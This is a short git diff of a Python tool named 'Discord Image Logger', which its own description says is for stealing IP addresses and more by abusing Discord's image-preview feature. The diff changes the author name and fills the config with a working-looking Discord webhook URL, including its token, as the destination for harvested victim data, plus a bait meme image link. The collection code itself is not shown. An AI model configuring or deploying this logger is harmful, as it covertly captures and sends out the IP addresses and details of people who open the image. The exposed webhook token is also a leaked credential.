@@ -5,12 +5,12 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Alex"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334760376700637254/1JuPFxdZreuSq4ff2qdYzimEGwKgaZlbFKc1pfFnoV2iXR9qzEFpQ-RKhz-YEqgQ_ipf",
+    "image": "https://www.google.com/imgres?q=meme&imgurl=https%3A%2F%2Fhoanghamobile.com%2Ftin-tuc%2Fwp-content%2Fuploads%2F2024%2F04%2Fanh-cuoi-34.jpg&imgrefurl=https%3A%2F%2Fhoanghamobile.com%2Ftin-tuc%2Fanh-cuoi-2%2F&docid=HlF7r4lSgspvZM&tbnid=w7gdyW3tp2cV-M&vet=12ahUKEwjI4MbjoJ-LAxVvRWcHHQCYDpwQM3oECGoQAA..i&w=1200&h=628&hcb=2&ved=2ahUKEwjI4MbjoJ-LAxVvRWcHHQCYDpwQM3oECGoQAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
